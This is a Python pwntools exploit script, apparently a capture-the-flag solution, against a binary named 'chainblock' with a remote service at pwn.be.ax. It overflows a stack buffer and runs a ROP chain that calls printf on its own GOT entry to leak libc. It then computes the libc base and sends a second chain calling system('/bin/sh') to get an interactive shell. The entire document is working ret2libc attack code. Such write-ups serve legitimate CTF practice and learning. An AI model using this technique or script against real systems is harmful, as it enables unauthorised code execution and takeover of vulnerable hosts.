from pwn import *

elf = context.binary = ELF("./chainblock")
libc = ELF('./libc.so.6')

if args.GDB:
	# p = gdb.debug(elf.path)
	p = gdb.debug(elf.path, '\n'.join([
		"b *verify",
		"c"
	]),  env={'LD_PRELOAD': "./libc.so.6"})
elif args.REMOTE:
	p = remote("pwn.be.ax", 5000)
else:
	p = process(elf.path, env={'LD_PRELOAD': "./libc.so.6"}) 


OFFSET = 0x108

payload = b'A' * OFFSET

# 0x0000000000401493 : pop rdi ; ret
# 0x000000000040101a : ret
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401493)
payload += p64(elf.got['printf'])
payload += p64(elf.symbols['printf'])
payload += p64(0x000000000040101a)
payload += p64(elf.symbols['verify'])

p.sendline(payload)

p.recvuntil(b'KYC failed, wrong identity!')
p.recvline()
leak = p.recvuntil("Please")
leak = leak.replace(b'Please', b'')

libc_printf = u64(leak.ljust(8, b'\x00'))
print(hex(libc_printf))

libc.address = libc_printf - libc.symbols['printf']

print(f"[+] libc base {hex(libc.address)}")

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols["system"]

payload = b'A' * OFFSET
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401493)
payload += p64(BINSH)
payload += p64(SYSTEM)
p.sendline(payload)

p.interactive()
